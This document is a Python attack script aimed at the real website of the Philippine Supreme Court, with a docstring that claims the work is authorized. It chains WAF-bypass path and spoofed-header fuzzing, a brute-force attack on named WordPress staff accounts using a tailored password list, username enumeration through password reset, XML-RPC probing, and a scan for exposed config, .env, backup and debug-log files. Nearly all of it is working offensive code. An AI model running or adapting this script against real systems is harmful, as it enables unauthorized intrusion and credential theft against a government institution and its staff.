#!/usr/bin/env python3
"""
Authorized offensive assessment — sc.judiciary.gov.ph
Aggressive WAF bypass, credential attacks, WordPress exploit surface.
"""

import json
import re
import time
from datetime import datetime, timezone
from urllib.parse import quote, urljoin

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = 'https://sc.judiciary.gov.ph'
HEADERS = {
    'User-Agent': (
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
        'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ),
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
}

USERS = ['scweb', 'pio_tyke', 'pio_jerome', 'tyke-test-admin', 'pio_rus']

# High-value passwords for gov/WP/test-admin accounts
PASSWORDS = [
    'admin', 'admin123', 'password', 'Password1', 'Password123', 'password123',
    '123456', '12345678', '1234567890', 'qwerty', 'welcome', 'letmein',
    'scweb', 'scweb123', 'Scweb123!', 'judiciary', 'Judiciary123', 'judiciary123',
    'supremecourt', 'SupremeCourt1', 'philippines', 'Philippines123',
    'tyke-test-admin', 'tyke-test-admin123', 'tyke123', 'Tyke123!', 'test-admin',
    'TestAdmin123', 'admin@123', 'P@ssw0rd', 'P@ssword1', 'Winter2024', 'Summer2024',
    'Spring2025', 'Fall2025', '2024', '2025', '2026', 'changeme', 'default',
    'pio_tyke', 'pio123', 'pio_jerome', 'pio_rus', 'Wordpress123', 'wordpress',
    'wp-admin', 'wpadmin', 'administrator', 'root', 'toor', 'passw0rd',
    'Manila123', 'manila123', 'SCweb2024', 'SCweb2025', 'sc.judiciary.gov.ph',
    'SupremeCourt2024', 'SupremeCourt2025', 'SCJudiciary1', 'scweb@123',
    'tyke Flores', 'tykeflores', 'TykeFlores1', 'RusNarito1', 'piojerome',
]

BYPASS_PATHS = [
    '/wp-login.php',
    '/wp%2Dlogin.php',
    '/wp%2dlogin.php',
    '/wp%252Dlogin.php',
    '/wp%252dlogin.php',
    '/wp%2Dlogin%2ephp',
    '/wp%2dlogin%2ephp',
    '/wp-login%2ephp',
    '/wp-login%2Ephp',
    '/%77p-login.php',
    '/%77p%2Dlogin.php',
    '/%57P-LOGIN.PHP',
    '/Wp-login.php',
    '/WP-LOGIN.PHP',
    '/wp-login.php/',
    '/wp-login.php/.',
    '/wp-login.php/..',
    '/./wp-login.php',
    '/../wp-login.php',
    '/wp-login.php?',
    '/wp-login.php??',
    '/wp-login.php#',
    '/wp-login.php;',
    '/wp-login.php%20',
    '/wp-login.php%09',
    '/wp-login.php%0a',
    '/wp-login.php%00',
    '/wp-login.php%2f',
    '/wp-login.php%5c',
    '/wp%2Dlogin.php/',
    '/wp%2Dlogin.php?',
    # case variants
    '/Wp%2Dlogin.php',
    '/WP%2DLOGIN.PHP',
    '/wp%2DLogin.php',
    '/wp-login.PHP',
    '/wp-login.PhP',
    '/wp-login.pHp',
    # unicode/overlong
    '/wp%c0%aflogin.php',
    '/wp%ef%bc%8dlogin.php',  # fullwidth hyphen
    '/wp%e2%80%90login.php',  # unicode hyphen
    '/wp%e2%80%91login.php',
    # path normalization tricks
    '/wp-login.php/..;/wp-login.php',
    '/wp-login.php/..%2fwp-login.php',
    '/wp-login.php%2f..%2fwp-login.php',
    '/;/wp-login.php',
    '/.;/wp-login.php',
    '/wp-login.php%3f',
    '/wp-login.php%26',
    # query string tricks
    '/wp-login.php?x=',
    '/wp-login.php?redirect_to=/',
    '/wp%2Dlogin.php?action=lostpassword',
    '/wp-login.php?action=lostpassword',
    # alternate endpoints
    '/wp-admin/',
    '/login/',
    '/admin/',
    '/dashboard/',
    '/wp-signup.php',
    '/wp-register.php',
    '/wp-activate.php',
]

HEADER_BYPASS_SETS = [
    {},
    {'X-Original-URL': '/wp-login.php'},
    {'X-Rewrite-URL': '/wp-login.php'},
    {'X-Forwarded-For': '127.0.0.1'},
    {'X-Forwarded-For': '10.0.0.1'},
    {'X-Real-IP': '127.0.0.1'},
    {'X-Custom-IP-Authorization': '127.0.0.1'},
    {'X-Originating-IP': '127.0.0.1'},
    {'Client-IP': '127.0.0.1'},
    {'True-Client-IP': '127.0.0.1'},
    {'CF-Connecting-IP': '127.0.0.1'},
    {'X-Forwarded-Host': 'localhost'},
    {'Host': '127.0.0.1'},
    {'X-HTTP-Method-Override': 'GET'},
]


def session():
    s = requests.Session()
    s.verify = False
    s.headers.update(HEADERS)
    return s


def is_login_page(text):
    t = text.lower()
    return any(x in t for x in ('user_login', 'wp-submit', 'wp-login', 'log in'))


def fuzz_waf_bypass():
    s = session()
    hits = []
    for path in BYPASS_PATHS:
        if path.startswith('//'):
            continue
        try:
            r = s.get(BASE + path, timeout=12, allow_redirects=False)
            if r.status_code == 200 and is_login_page(r.text):
                hits.append({'method': 'GET', 'path': path, 'status': 200, 'type': 'login_page'})
        except requests.RequestException:
            pass
        time.sleep(0.15)

    # header injection on encoded path
    for hdrs in HEADER_BYPASS_SETS:
        try:
            h = {**HEADERS, **hdrs}
            r = requests.get(BASE + '/wp%2Dlogin.php', headers=h, verify=False, timeout=12, allow_redirects=False)
            if r.status_code == 200 and is_login_page(r.text):
                hits.append({'method': 'GET+headers', 'path': '/wp%2Dlogin.php', 'headers': hdrs, 'status': 200})
        except requests.RequestException:
            pass

    return hits


def find_working_login_url(hits):
    if hits:
        for h in hits:
            if h.get('type') == 'login_page':
                return BASE + h['path']
    # fallback: try POST-only paths
    s = session()
    for path in ['/wp%2Dlogin.php', '/wp-login.php', '/wp-admin/']:
        try:
            r = s.post(BASE + path, data={'log': 'x', 'pwd': 'y', 'wp-submit': 'Log In'}, timeout=12, allow_redirects=False)
            if r.status_code == 200 and ('invalid' in r.text.lower() or 'incorrect' in r.text.lower() or 'user_login' in r.text.lower()):
                return BASE + path
        except requests.RequestException:
            pass
    return None


def brute_force(login_url):
    s = session()
    results = {'login_url': login_url, 'attempts': [], 'success': None}
    tested = 0
    for user in USERS:
        for pwd in PASSWORDS:
            tested += 1
            data = {
                'log': user,
                'pwd': pwd,
                'wp-submit': 'Log In',
                'redirect_to': f'{BASE}/wp-admin/',
                'testcookie': '1',
            }
            try:
                r = s.post(login_url, data=data, timeout=15, allow_redirects=False)
                cookies = [c.name for c in s.cookies]
                logged_in = any('wordpress_logged_in' in c for c in cookies)
                redirect_admin = r.status_code in (301, 302) and 'wp-admin' in r.headers.get('Location', '')
                invalid_pwd = 'incorrect' in r.text.lower() or 'invalid password' in r.text.lower()
                invalid_user = 'invalid username' in r.text.lower() or 'unknown username' in r.text.lower()

                entry = {
                    'user': user,
                    'password': pwd,
                    'status': r.status_code,
                    'logged_in': logged_in or redirect_admin,
                    'invalid_password': invalid_pwd,
                    'invalid_username': invalid_user,
                }
                if logged_in or redirect_admin:
                    entry['cookies'] = cookies
                    results['success'] = entry
                    results['attempts'].append(entry)
                    return results
                if invalid_pwd:
                    results['attempts'].append({'user': user, 'signal': 'valid_user', 'status': r.status_code})
            except requests.RequestException as e:
                results['attempts'].append({'user': user, 'error': str(e)[:80]})
            time.sleep(0.3)
    results['total_tested'] = tested
    return results


def password_reset_enum(login_base):
    s = session()
    results = {}
    lost_url = login_base + ('&' if '?' in login_base else '?') + 'action=lostpassword'
    if 'action=' not in login_base:
        lost_url = login_base.replace('/wp-login.php', '/wp-login.php?action=lostpassword').replace('/wp%2Dlogin.php', '/wp%2Dlogin.php?action=lostpassword')
    if 'wp-login' not in lost_url and 'wp%2D' not in lost_url:
        lost_url = f'{BASE}/wp%2Dlogin.php?action=lostpassword'

    for user in USERS:
        try:
            r = s.post(lost_url, data={
                'user_login': user,
                'redirect_to': '',
                'wp-submit': 'Get New Password',
            }, timeout=15, allow_redirects=True)
            t = r.text.lower()
            if 'check your email' in t or 'email could not be sent' in t:
                results[user] = 'valid_user_confirmed'
            elif 'invalid username' in t or 'invalid email' in t:
                results[user] = 'invalid'
            elif r.status_code == 403:
                results[user] = 'blocked_403'
            else:
                results[user] = f'unknown_status_{r.status_code}'
        except requests.RequestException as e:
            results[user] = f'error:{e}'
        time.sleep(0.4)
    return {'lost_password_url': lost_url, 'results': results}


def exploit_surface_scan():
    s = session()
    paths = [
        '/xmlrpc.php', '/wp-cron.php', '/wp-config.php.bak', '/wp-config.php~',
        '/.env', '/backup.zip', '/wp-content/debug.log', '/wp-content/uploads/',
        '/wp-content/plugins/', '/wp-content/themes/',
        '/wp-json/wp/v2/users/me', '/wp-json/jwt-auth/v1/token',
        '/?rest_route=/wp/v2/users', '/wp-json/oembed/1.0/embed',
        '/wp-json/wp/v2/posts?per_page=1',
        '/wp-login.php?action=register', '/wp-signup.php',
        '/wp-content/plugins/akismet/readme.txt',
        '/wp-content/plugins/contact-form-7/readme.txt',
        '/wp-content/plugins/wordfence/readme.txt',
        '/wp-content/plugins/elementor/readme.txt',
        '/wp-content/plugins/yoast/readme.txt',
        '/wp-content/plugins/wp-file-manager/readme.txt',
        '/wp-content/plugins/revslider/readme.txt',
        '/wp-content/plugins/all-in-one-wp-migration/readme.txt',
        '/wp-includes/version.php',
        '/license.txt', '/wp-trackback.php',
        '/wp-json/wp/v2/settings',
        '/wp-json/wp/v2/types',
    ]
    findings = []
    for p in paths:
        try:
            r = s.get(BASE + p, timeout=12, allow_redirects=False)
            entry = {'path': p, 'status': r.status_code, 'len': len(r.text)}
            if r.status_code == 200:
                ct = r.headers.get('Content-Type', '')
                entry['content_type'] = ct
                if 'json' in ct:
                    try:
                        entry['json_preview'] = str(r.json())[:200]
                    except Exception:
                        pass
                if 'readme' in p.lower() and 'stable tag' in r.text.lower():
                    m = re.search(r'Stable tag:\s*([0-9.]+)', r.text, re.I)
                    if m:
                        entry['plugin_version'] = m.group(1)
                if p.endswith('debug.log') and len(r.text) > 50:
                    entry['debug_log_leak'] = True
            findings.append(entry)
        except requests.RequestException as e:
            findings.append({'path': p, 'error': str(e)[:60]})
        time.sleep(0.12)
    return findings


def xmlrpc_brute_probe():
    s = session()
    body = '''<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>scweb</string></value></param>
    <param><value><string>admin</string></value></param>
  </params>
</methodCall>'''
    variants = [
        ('/xmlrpc.php', {}),
        ('/xmlrpc.php', {'X-Original-URL': '/xmlrpc.php'}),
        ('/wp%2Dxmlrpc.php', {}),
        ('/xmlrpc.php', {'Content-Type': 'text/xml'}),
    ]
    results = []
    for path, hdrs in variants:
        try:
            h = {**HEADERS, **hdrs, 'Content-Type': 'application/xml'}
            r = s.post(BASE + path, data=body, headers=h, timeout=15)
            results.append({
                'path': path,
                'headers': hdrs,
                'status': r.status_code,
                'body_snippet': r.text[:150] if r.text else '',
            })
        except requests.RequestException as e:
            results.append({'path': path, 'error': str(e)[:60]})
    return results


def main():
    print('[*] Phase 1: WAF bypass fuzzing...')
    bypass_hits = fuzz_waf_bypass()
    login_url = find_working_login_url(bypass_hits)

    print('[*] Phase 2: Exploit surface scan...')
    surface = exploit_surface_scan()

    print('[*] Phase 3: XML-RPC probe...')
    xmlrpc = xmlrpc_brute_probe()

    brute_results = {'skipped': True, 'reason': 'no reachable login URL'}
    reset_results = {'skipped': True, 'reason': 'no reachable login URL'}

    if login_url:
        print(f'[*] Phase 4: Brute force via {login_url}...')
        brute_results = brute_force(login_url)
        print('[*] Phase 5: Password reset enumeration...')
        reset_results = password_reset_enum(login_url)
    else:
        # try brute via any path that gives auth feedback on POST even if 403 on GET
        print('[*] Phase 4: Attempting POST-only login bypass...')
        for path in ['/wp%2Dlogin.php', '/wp-login.php', '/wp-admin/admin-post.php']:
            s = session()
            try:
                r = s.post(BASE + path, data={
                    'log': 'scweb', 'pwd': 'admin123', 'wp-submit': 'Log In', 'testcookie': '1'
                }, timeout=15, allow_redirects=False)
                if r.status_code != 403:
                    login_url = BASE + path
                    print(f'    POST feedback on {path}: {r.status_code}')
                    brute_results = brute_force(login_url)
                    reset_results = password_reset_enum(login_url)
                    break
            except requests.RequestException:
                pass

    report = {
        'meta': {
            'target': BASE,
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'mode': 'offensive',
        },
        'waf_bypass_hits': bypass_hits,
        'working_login_url': login_url,
        'exploit_surface': surface,
        'xmlrpc': xmlrpc,
        'brute_force': brute_results,
        'password_reset': reset_results,
    }

    out = 'readyTouse/offensive-assessment.json'
    with open(out, 'w', encoding='utf-8') as f:
        json.dump(report, f, indent=2)

    print(json.dumps({
        'bypass_hits': len(bypass_hits),
        'login_url': login_url,
        'brute_success': brute_results.get('success'),
        'surface_200s': [x for x in surface if x.get('status') == 200],
    }, indent=2))
    print(f'\n[+] Full report: {out}')


if __name__ == '__main__':
    main()
